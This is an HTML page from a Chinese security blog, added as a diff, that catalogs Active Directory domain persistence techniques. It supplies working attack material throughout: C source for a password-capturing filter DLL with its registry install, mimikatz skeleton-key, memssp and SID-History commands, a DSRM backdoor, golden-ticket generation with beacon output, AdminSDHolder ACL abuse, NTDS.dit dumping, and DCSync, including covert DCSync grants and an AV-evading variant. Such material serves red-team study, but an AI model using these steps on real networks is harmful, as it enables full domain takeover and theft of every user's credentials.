@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>域权限维持通用方法总汇 - ConsT27's Blog</title>
+    <link href="../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u57df\u6743\u9650\u7ef4\u6301\u901a\u7528\u65b9\u6cd5\u603b\u6c47", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_2" },
+              {title: "Hook PasswordChangeNotify", url: "#hook-passwordchangenotify" },
+              {title: "\u4e07\u80fd\u5bc6\u7801", url: "#_3" },
+              {title: "SSP\u6ce8\u5165", url: "#ssp" },
+              {title: "SID History\u540e\u95e8", url: "#sid-history" },
+              {title: "DSRM\u540e\u95e8", url: "#dsrm" },
+              {title: "\u59d4\u6d3e\u540e\u95e8", url: "#_4" },
+              {title: "\u9ec4\u91d1\u7968\u636e\u751f\u6210", url: "#_5" },
+              {title: "AdminSDHolder", url: "#adminsdholder" },
+              {title: "Ntds.dit", url: "#ntdsdit" },
+              {title: "\u5229\u7528\u8bc1\u4e66\u6a21\u7248", url: "#_7" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/" class="btn btn-xs btn-link">
+        域管提权一把梭
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/" class="btn btn-xs btn-link">
+        利用acl进行横向
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="_1">域权限维持通用方法总汇</h1>
+<h2 id="_2">目录</h2>
+<ul>
+<li><a href="#Hook-PasswordChangeNotify">Hook PasswordChangeNotify</a></li>
+<li><a href="#万能密码">万能密码</a></li>
+<li><a href="#SSP注入">SSP注入</a></li>
+<li><a href="#SID-History后门">SID History后门</a></li>
+<li><a href="#DSRM后门">DSRM后门</a></li>
+<li><a href="#委派后门">委派后门</a></li>
+<li><a href="#黄金票据生成">黄金票据生成</a></li>
+<li><a href="#AdminSDHolder">AdminSDHolder</a></li>
+<li><a href="#Ntdsdit">Ntds.dit</a><ul>
+<li><a href="#利用VSS导出">利用VSS导出</a><ul>
+<li><a href="#VSSADMIN">VSSADMIN</a></li>
+<li><a href="#Ntdsutilexe">Ntdsutil.exe</a></li>
+</ul>
+</li>
+<li><a href="#解析NTDSDIT">解析NTDS.DIT</a><ul>
+<li><a href="#Impacket">Impacket</a></li>
+</ul>
+</li>
+<li><a href="#远程解析">远程解析</a><ul>
+<li><a href="#DCSYNC">DCSYNC</a></li>
+<li><a href="#DCSYNC的powershell实现">DCSYNC的powershell实现</a></li>
+<li><a href="#配合EXCHANGE用户达到域提权目的">配合EXCHANGE用户达到域提权目的</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#利用证书模版">利用证书模版</a></li>
+</ul>
+<h2 id="hook-passwordchangenotify">Hook PasswordChangeNotify</h2>
+<p>原理：当用户修改密码时会输入明文密码，LSA会调用PasswordChangeNotify 在系统中同步密码。我们HOOK这个函数，改变其行为，就能达到获取用户修改后的密码的明文.</p>
+<p>Tool: Powersploit下的Invoke-ReflectivePEInjection.ps1 （用于注入）
+<a href="https://github.com/PowerShellMafia/PowerSploit" title="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a>
+以及 <a href="https://github.com/clymb3r/Misc-Windows-Hacking" title="https://github.com/clymb3r/Misc-Windows-Hacking">https://github.com/clymb3r/Misc-Windows-Hacking</a> 的HookPasswordChange.dll(需自行编译)</p>
+<pre><code class="language-纯文本">Import-Module .\Invoke-ReflectivePEInjection.ps1
+Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass
+</code></pre>
+<p>执行如上命令，只要修改了用户的密码，修改后的明文密码就会记录在 C:\Windows\Temp\passwords.txt 文件中。</p>
+<p>下面我们分析一下原理</p>
+<p>当密码改变请求发生时，LSA会调用Password Filters。每一个password filter会先验证新密码的合法性和复杂度，然后LSA会发出请求已更改的信号。</p>
+<p><img alt="QQ截图20210217133057" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217133057.png" title="QQ截图20210217133057" /></p>
+<p>该过程由 password notification DLL 完成。所以我们只需要劫持这个DLL，把它换成我们自定义的DLL即可达到目的。
+这种方式一般在Server服务器上利用率较高
+通常来说，这个dll文件的在注册表中的路径是 hklm\system\currentcontrolset\control\lsa的 notification packages表项。</p>
+<p><img alt="QQ截图20210217133116" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217133116.png" title="QQ截图20210217133116" /></p>
+<p>我们要利用该方法，首先要确保密码策略已启用</p>
+<p><img alt="QQ截图20210217133138" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217133138.png" title="QQ截图20210217133138" /></p>
+<p>至于命令行怎么修改。可以这样</p>
+<pre><code class="language-纯文本">secedit /export /cfg gp.inf /quiet   将组策略导出为文件
+在该文件里将PasswordComplexity项值修改为1
+然后用secedit /configure /db gp.sdb /cfg gp.inf /quiet 将其导入数据库
+刷新组策略： gpupdate/force
+重启后生效
+</code></pre>
+<p>下面我们构造dll文件去覆盖它。</p>
+<p>首先我们的dll文件内容如下。</p>
+<pre><code class="language-纯文本">#include&lt;Windows.h&gt;
+#include&lt;NTSecAPI.h&gt;
+#include &lt;fstream&gt;
+
+extern &quot;C&quot; __declspec(dllexport) BOOLEAN __stdcall InitializeChangeNotify() {
+  OutputDebugString(L&quot;InitializeChangeNotify&quot;);
+  return TRUE;
+}
+
+extern &quot;C&quot; __declspec(dllexport) BOOLEAN __stdcall PasswordFilter(
+  PUNICODE_STRING AccountName,
+  PUNICODE_STRING FullName,
+  PUNICODE_STRING Password,
+  BOOLEAN SetOperation)
+{
+  OutputDebugString(L&quot;PasswordFilter&quot;);
+  return TRUE;
+}
+
+extern &quot;C&quot; __declspec(dllexport) BOOLEAN __stdcall PasswordChangeNotify(
+  PUNICODE_STRING UserName,
+  ULONG RelativeId,
+  PUNICODE_STRING NewPassword)
+{
+  FILE *pFile;
+  fopen_s(&amp;pFile, &quot;C:\\logFile.txt&quot;, &quot;a+&quot;);
+  fprintf(pFile, &quot;%ws:%ws&quot;, UserName-&gt;Buffer, NewPassword-&gt;Buffer);
+  return 0;
+}
+</code></pre>
+<p>然后把这个dll文件放入system32文件，然后修改注册表，使 hklm\system\currentcontrolset\control\lsa的 notification packages表项包括我们的恶意dll文件，具体命令行操作如下</p>
+<pre><code class="language-纯文本">REG ADD &quot;HKLMSYSTEMCurrentControlSetControlLsa&quot; /v &quot;Notification Packages&quot; /t REG_MULTI_SZ /d &quot;evildll&quot; /f
+</code></pre>
+<p>重启后生效。无奈的是我把dll文件写出来了且确保是正确的，在win7和win2012上复现均失败，网上成功的例子是win2008server，可惜我并没有这个版本的虚拟机不过原理倒是懂了</p>
+<h2 id="_3">万能密码</h2>
+<p>运用mimkatz可以在域控机上对所有用户添加一个统一密码用来登录.</p>
+<pre><code class="language-纯文本">mimikatz# privilege::debug
+mimikatz# misc::skeleton
+</code></pre>
+<p>然后所有用户都能用密码 mimiaktz登陆了</p>
+<h2 id="ssp">SSP注入</h2>
+<p>ssp:一个DLL文件，用来实现Windows身份验证功能，比如kerberos，ntlm。系统启动时SSP会被自动加载入lsass.exe
+sspi:SSP的API接口</p>
+<p>如果我们自定义个恶意dll文件让他在系统启动时自动加载到lsass.exe,就能得到进程中的明文密码</p>
+<p>临时性注入(重启便失效)</p>
+<pre><code class="language-纯文本">mimikatz# privilege::debug
+mimiaktz# misc::memssp
+</code></pre>
+<p>执行如上命令, 然后只要目标机器不重启，在目标机器上登录的用户名和密码将会被记录在 C:\Windows\System32\mimilsa.log 文件中。</p>
+<p><img alt="QQ截图20210217133322" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217133322.png" title="QQ截图20210217133322" /></p>
+<p>长期性注入（重启不失效）</p>
+<p>把 mimikatz中的mimilib.dll放到系统的C:\Windows\System32\ 目录下，并将 mimilib.dll 添加到注册表中，使用这种方法，即使系统重启，也不会影响持久化效果。</p>
+<p>修改注册表 HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/Lsa 的 Security Packages 项，加载新的DLL文件</p>
+<p><img alt="QQ截图20210217133335" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217133335.png" title="QQ截图20210217133335" /></p>
+<p>用户在登录时输入的账号密码将会被记录在 C:\Windows\System32\kiwissp.log</p>
+<h2 id="sid-history">SID History后门</h2>
+<p>sid history:当我们把域A的用户x迁移到域B时，B域中x的sid会发生改变，随即而来的是权限也会发生改变。所以为了避免这种权限改变，sid history诞生了， 系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源 。</p>
+<p>在域控上</p>
+<pre><code class="language-纯文本">privilege::debug
+sid::patch
+sid::add /sam:const27 /new:administrator 将administrator的SID添加到const27的sid history属性
+</code></pre>
+<p>然后可以在域控上验证其sid history是否更改成功</p>
+<pre><code class="language-纯文本">Import-Module activedirectory
+Get-ADUser const27 -Properties sidhistory
+</code></pre>
+<p><img alt="QQ截图20210217133438" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217133438.png" title="QQ截图20210217133438" /></p>
+<p>可以发现现在是有SIDHistory属性了。而且末尾的500预示着ADMIN权限</p>
+<h2 id="dsrm">DSRM后门</h2>
+<p>DSRM账号:每个域控上都有一个本地管理员账户也就是DSRM账户，用于在域环境出现故障时本地登录进行修复.可以利用这个账户进行持久化操作。（ 如果域控制器的系统版本为Windows Server 2003，则不能使用该方法进行持久化操作。 ）</p>
+<p>我们先设置DSRM密码
+域控上输入ntdsutil
+然后输入reset password on server null
+然后键入密码，最后按q退出即可</p>
+<p><img alt="QQ截图20210217133606" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217133606.png" title="QQ截图20210217133606" /></p>
+<p>在mimikatz中dump本地hash可以看到多出来个Administrator</p>
+<p><img alt="QQ截图20210217133631" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217133631.png" title="QQ截图20210217133631" /></p>
+<p>然后设置DSRM登陆方式
+DSRM登陆方式有三种分别对应123.</p>
+<ul>
+<li>0：默认值，只有当域控制器重启并进入DSRM模式时，才可以使用DSRM管理员账号</li>
+<li>1：只有当本地AD、DS服务停止时，才可以使用DSRM管理员账号登录域控制器</li>
+<li>2：在任何情况下，都可以使用DSRM管理员账号登录域控制器</li>
+</ul>
+<p>我们需要将他改成2才行。powershell执行</p>
+<pre><code class="language-纯文本">New-ItemProperty &quot;hklm:\system\currentcontrolset\control\lsa\&quot; -name &quot;dsrmadminlogonbehavior&quot; -value 2 -propertyType DWORD
+</code></pre>
+<p>即可.然后直接psexec登录(这里用的是cs)</p>
+<p><img alt="QQ截图20210217133652" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217133652.png" title="QQ截图20210217133652" /></p>
+<p>注意填Realm时要填上面dump出sam时的域名（这里是DC）</p>
+<h2 id="_4">委派后门</h2>
+<p>这个很简单，利用约束性委派或者基于资源的约束性委派攻击得到的ST2保存起来，或者非约束性委派得到的TGT，要用的时候加载进内存就行了</p>
+<h2 id="_5">黄金票据生成</h2>
+<pre><code class="language-纯文本">#提权
+privilege::debug
+
+#生成黄金票据并导入
+kerberos::golden /user:administrator /domain:const.com /sid:当前用户sid去掉最后一个数据 /krbtgt:krbtgt的hash /ptt
+</code></pre>
+<p>cs</p>
+<pre><code class="language-纯文本">beacon&gt; mimikatz kerberos::golden /user:Administrator /domain:ocean.com /sid:S-1-5-21-436250240-237335239-2342608000 /krbtgt:31d6cfe0d16ae931b73c59d7e0c089c0 /endin:480 /renewmax:10080 /ptt
+[*] Tasked beacon to run mimikatz's kerberos::golden /user:Administrator /domain:ocean.com /sid:S-1-5-21-436250240-237335239-2342608000 /krbtgt:31d6cfe0d16ae931b73c59d7e0c089c0 /endin:480 /renewmax:10080 /ptt command
+[+] host called home, sent: 438858 bytes
+[+] received output:
+User      : Administrator
+Domain    : ocean.com (OCEAN)
+SID       : S-1-5-21-436250240-237335239-2342608000
+User Id   : 500
+Groups Id : *513 512 520 518 519 
+ServiceKey: 31d6cfe0d16ae931b73c59d7e0c089c0 - rc4_hmac_nt      
+Lifetime  : 2021/12/6 15:46:14 ; 2021/12/6 23:46:14 ; 2021/12/13 15:46:14
+-&gt; Ticket : ** Pass The Ticket **
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for 'Administrator @ ocean.com' successfully submitted for current session
+
+</code></pre>
+<h2 id="adminsdholder">AdminSDHolder</h2>
+<p>AdminSDHolder是一个特殊容器，用作受保护用户或组的ACM模板。AD定期把 AdminSDHolder对象的ACL 应用到所有受保护用户或组上，防止其被有意或故意修改。 如果能够修改AdminSDHolder对象的ACL，那么修改的权限将自动应用于所有受保护的AD账户和组，这可以作为一个域环境权限维持的方法 。</p>
+<p>如何寻找受保护用户或组：</p>
+<p>受保护用户或组的 <strong>AdminCount属性为1</strong> 。 但是，如果对象已移出受保护组，其AdminCount属性仍为1，也就是说，有可能获得曾经是受保护组的帐户和组 。</p>
+<p>使用powerview.ps1<code>Get-NetUser -AdminCount</code>即可获得受保护用户
+<code>Get-NetGroup -AdminCount</code>即可获得受保护组</p>
+<p>如何修改ADMINSDHOLDER的ACL</p>
+<p>域管执行以下命令(powerview.ps1)</p>
+<pre><code class="language-纯文本">Add-DomainObjectAcl -TargetSearchBase &quot;LDAP://CN=AdminSDHolder,CN=System,DC=CONST,DC=COM&quot; -PrincipalIdentity xx -Verbose -Rights ALL
+给AdminSDHoloder添加一条ACL,让xx用户获得完全控制权
+</code></pre>
+<p><img alt="QQ截图20210217133841" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217133841.png" title="QQ截图20210217133841" /></p>
+<p>然后默认等60分钟，待ADMINSDHOLDER生效后，xx就获得所有受保护对象的完全控制权了</p>
+<p><img alt="QQ截图20210217133909" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217133909.png" title="QQ截图20210217133909" /></p>
+<h2 id="ntdsdit">Ntds.dit</h2>
+<p>"Ntds.dit文件是域环境中域控上会有的一个二进制文件，是主要的活动目录数据库，其文件路径为域控的 %SystemRoot%\ntds\ntds.dit，活动目录始终会访问这个文件，所以文件禁止被读取。Ntds.dit包括但不限于有关域用户、组和组成员身份和凭据信息、GPP等信息。它包括域中所有用户的密码哈希值，为了进一步保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。"——FREEBUF.whoami《内网渗透测试：从NTDS.dit获取域散列值》
+插个题外话：非域的工作组主机其密码等信息存储在SAM中。</p>
+<p>我们获取了域控后一般第一步便是导出Ntds.dit中的信息,怎么导出呢？</p>
+<h3 id="vss">利用VSS导出</h3>
+<p>VSS全称为Volume Shadow Copy Service，卷影拷贝服务，属于快照技术的一种，主要用于备份和恢复，即使文件处于被锁定状态。</p>
+<p>其获取NTDS.DIT的基本步骤为：</p>
+<p>创建目标主机所有文件的卷影拷贝。
+在创建的卷影拷贝中复制出NTDS.DIT。
+删除卷影拷贝。</p>
+<h4 id="vssadmin">VSSADMIN</h4>
+<p>vssadmin是windows上一个命令行卷影拷贝服务管理工具。其适用于： Windows 10，Windows 8.1，Windows Server 2016，Windows Server 2012 R2，Windows Server 2012，Windows Server 2008 R2，Windows Server 2008</p>
+<p><img alt="image-20210729165404714" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210729165404714.png" title="image-20210729165404714" /></p>
+<p>其导出NTDS.DIT的方法如下</p>
+<p>创建一个C盘的卷影拷贝</p>
+<pre><code class="language-纯文本">vssadmin create shadow /for=c:
+</code></pre>
+<p><img alt="image-20210729165602611" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210729165602611.png" title="image-20210729165602611" /></p>
+<p>然后将卷影中的ntds.dit复制出来</p>
+<pre><code class="language-纯文本">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit C:\ntds.dit
+</code></pre>
+<p>然后删除卷影</p>
+<pre><code class="language-纯文本">vssadmin delete shadows /for=c: /quiet
+</code></pre>
+<h4 id="ntdsutilexe">Ntdsutil.exe</h4>
+<p>Ntdsutil.exe 是一个为 Active Directory 提供管理设施的命令行工具，该工具被默认安装在了域控制器上，可以在域控上直接操作，也可以通过域内机器在域控上远程操作，但是需要管理员权限。</p>
+<p>为WINDOWS上所有文件创建快照</p>
+<pre><code class="language-纯文本">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit
+</code></pre>
+<p><img alt="image-20210729170339152" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210729170339152.png" title="image-20210729170339152" /></p>
+<p>我们得到了个快照的ID，接下来我们就需要加载这个卷影到我们的磁盘中</p>
+<pre><code class="language-纯文本">ntdsutil snapshot &quot;mount {bdccff3c-810c-4f78-9d80-c6729910e83a}&quot; quit quit
+</code></pre>
+<p>执行后就会发现这个快照加载到了C盘下（这里dir看到的NTDS.DIT与本次实验无关，是上次实验残留下来没删的）</p>
+<p><img alt="image-20210729170830331" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210729170830331.png" title="image-20210729170830331" /></p>
+<p>然后将ntds.dit复制出来</p>
+<pre><code class="language-纯文本">copy c:\$SNAP_202107291703_VOLUMEC$\Windows\NTDS\ntds.dit c:\ntds.dit
+</code></pre>
+<p>然后删除快照</p>
+<pre><code class="language-纯文本">ntdsutil snapshot &quot;mount {bdccff3c-810c-4f78-9d80-c6729910e83a}&quot; &quot;delete {bdccff3c-810c-4f78-9d80-c6729910e83a}&quot; quit quit
+</code></pre>
+<p>同时，NTDSUTIL还有一个更加便捷的导出ntds.dit的方法：通过IFM
+IFM中文叫媒体安装集，在我们通过NTDSUTIL来创建媒体安装集时，会自动进行生成快照、加载、将ntds.dit、计算机的SAM和SYSTEM文件复制到目标文件夹中等操作，需管理员权限。</p>
+<pre><code class="language-纯文本">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:/test&quot; q q 
+</code></pre>
+<p><img alt="image-20210729171538273" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210729171538273.png" title="image-20210729171538273" /></p>
+<p>然后在C:\test\Active Directory\ntds.dit，就是NTDS.DIT，我们复制出来就行了。
+然后再把test文件夹删除即可。</p>
+<h3 id="ntdsdit_1">解析NTDS.DIT</h3>
+<p>在提取NTDS.DIT后，我们需要再提取一个文件system.hive，因为system.hive中存放着NTDS.DIT的密钥，有了它我们才能解析NTDS.DIT。</p>
+<p>可以用刚刚提到的VSS方法获取，也可以直接用以下命令从注册表中拉取.</p>
+<pre><code class="language-纯文本">reg save hklm\system c:\system.hive
+</code></pre>
+<h4 id="impacket">Impacket</h4>
+<p>impacket框架集成了许多好玩的东西，他其中的secretdump.py脚本实现了解析ntds.dit的功能</p>
+<p>直接再impacket的example下</p>
+<pre><code class="language-纯文本">python .\secretsdump.py -system .\system.hive -ntds .\ntds.dit local
+</code></pre>
+<p><img alt="image-20210729235923711" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210729235923711.png" title="image-20210729235923711" /></p>
+<h3 id="_6">远程解析</h3>
+<h4 id="dcsync">DCSYNC</h4>
+<p>"DCSync是Mimikatz在2015年添加的一个功能，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，其能够利用卷影拷贝服务直接读取ndts.dit并导出域内所有用户的哈希值。需要管理员权限。"</p>
+<p>这个东西 可以实现不登录到域控而获取域控上的数据
+获得以下权限就可以使用了</p>
+<ul>
+<li>Administrators组内的用户</li>
+<li>Domain Admins组内的用户</li>
+<li>Enterprise Admins组内的用户</li>
+<li>域控制器的计算机帐户</li>
+</ul>
+<p>然后在mimikatz里
+privilege::debug
+lsadump::dcsync /user:xxxx /domain:xxxxx /csv 即可</p>
+<p>想获取全部hash也可以lsadump::dcsync /domain:xxx.com /all /csv</p>
+<p><img alt="QQ截图20210217133813" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217133813.png" title="QQ截图20210217133813" /></p>
+<p>然后我们就可以通过krbtgt hash制作黄金票据登录administrator。
+如果还想隐蔽一点，可以给普通用户添加如下ACE,使其获得dcsync权限</p>
+<p>-
+-   DS-Replication-Get-Changes(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
+-   DS-Replication-Get-Changes-All(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
+-   DS-Replication-Get-Changes(GUID:89e95b76-444d-4c62-991a-0facbeda640c)</p>
+<p>可以以管理员权限运行powerview.ps1完成以上操作</p>
+<pre><code class="language-纯文本">#给域用户hack添加以上三条ACE
+Add-DomainObjectAcl -TargetIdentity &quot;DC=xie,DC=com&quot; -PrincipalIdentity hack -Rights DCSync -Verbose
+
+#给域用户hack删除以上三条ACE
+Remove-DomainObjectAcl -TargetIdentity &quot;DC=xie,DC=com&quot; -PrincipalIdentity hack -Rights DCSync -Verbose
+</code></pre>
+<p>然后普通用户也可以用mimikatz调用dcsync导出hash了</p>
+<h4 id="dcsyncpowershell">DCSYNC的powershell实现</h4>
+<p>mimikatz免杀过不去的话可以试试这个<a href="https://gist.github.com/monoxgas/9d238accd969550136db#file-invoke-dcsync-ps1" title="https://gist.github.com/monoxgas/9d238accd969550136db#file-invoke-dcsync-ps1">https://gist.github.com/monoxgas/9d238accd969550136db#file-invoke-dcsync-ps1</a></p>
+<pre><code class="language-纯文本">Import-Module .\Invoke-DCSync.ps1
+Invoke-DCSync -DumpForest | ft -wrap -autosize    // 导出域内所有用户的hash
+
+Invoke-DCSync -DumpForest -Users @(&quot;administrator&quot;) | ft -wrap -autosize      // 导出域内administrator账户的hash
+</code></pre>
+<p>我这里WIN10域控打不通，不知道为啥</p>
+<h4 id="exchange">配合EXCHANGE用户达到域提权目的</h4>
+<p>exchange安装后会在AD上生成两个容器</p>
+<p><img alt="QQ截图20210217141602" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217141602.png" title="QQ截图20210217141602" /></p>
+<p>其中exchange windows permissions组的用户拥有writeDACL权限， Exchange Trusted Subsystem 是 Exchange Windows Permission 的成员，能继承writedacl权限，有这个权限后就能使用dcsync导出所有用户hash。
+其中exchange trusted subsystem组甚至可能有继承自administrators组的权限。</p>
+<p><img alt="QQ截图20210217141614" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217141614.png" title="QQ截图20210217141614" /></p>
+<p>同时，在安装exchange后还会生成一个组Organization Management，这个组可以修改其他exchange组的用户信息。
+当然也可以修改Exchange Trusted Subsystem组的成员信息，比如向里面加一个以获得的用户。</p>
+<p>综上所述，只要获得Organization Management,Exchange Trusted Subsystem,Exchange Windows Permission,就可以通过dcsync来获取整个域权限。
+当然，想获得上述组用户权限，还是不太容易的。</p>
+<h2 id="_7">利用证书模版</h2>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/" class="btn btn-xs btn-link">
+        域管提权一把梭
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/" class="btn btn-xs btn-link">
+        利用acl进行横向
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
